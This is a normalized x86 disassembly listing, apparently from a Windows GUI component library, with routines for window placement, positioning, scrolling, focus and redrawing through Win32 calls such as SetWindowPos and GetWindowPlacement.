mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464294
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44da78
test eax eax
jne r-xdata
sub_452a14
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4527fc
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44da78
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464294
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44da78
test eax eax
jne r-xdata
sub_452a70
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464294
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44da78
mov [ esi + 0xc ] eax
sub_452aa4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44bea0
mov eax ebx
mov si 0xffd0
call sub_4034a4
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_44c214
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_452b7c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_44fde8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44fdac
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4034a4
inc edi
dec ebx
jne r-xdata
sub_452bc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_452c62
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452b7c
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c69
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_452c70
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44f978
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44fdac
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_452d60
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_418930
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4187c4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_418950
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4188d4
call sub_4530b8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4188d4
call sub_4530b8
sub_452e38
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_452d60
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_452e98
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4530b8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4530b8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
test eax eax
jne r-xdata
sub_452efc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44da78
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov eax ebx
call sub_44fde8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44fdac
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44fdac
test [ eax + 0x52 ] 0x4
je r-xdata
sub_452fc0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_44c214
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_452ff8
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_464294
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_453038
push ebx
mov ebx eax
mov eax ebx
call sub_464294
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_468000
pop ebx
retn
mov eax ebx
call sub_4642bc
mov eax ebx
call sub_4530b8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_453070
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_453094
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_453094
sub_4530cc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_417298
mov eax edi
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44fdac
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_453160
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4530b8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_453198
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4533bc
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4530b8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_4034a4
sub_453254
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_418930
pop esi
pop ebx
retn
sub_453278
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_453254
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4187c4
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_418950
sub_4532ec
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4533bc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44da78
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_45334c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4533b0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4533b7
lea eax [ ebp - 0x4 ]
call sub_405934
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_4034a4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_40594c
sub_4533c8
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44bea0
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_453480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4188d4
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_418778
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_4034a4
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4534e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4535d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_4034a4
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4535dd
mov eax [ ebp - 0x14 ]
call sub_4032a8
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_418930
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4188d4
mov edi eax
mov eax edi
mov si 0xffb8
call sub_4034a4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_4535ec
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_4534e0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_453618
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_464294
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4534e0
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4534e0
mov edx eax
mov eax esi
call sub_467f00
sub_45365c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4536a4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_452d60
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44cae4
sub_4536ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_453770
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4533bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_44fde8
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_453b32
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_44fde8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4536ec
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44fdac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
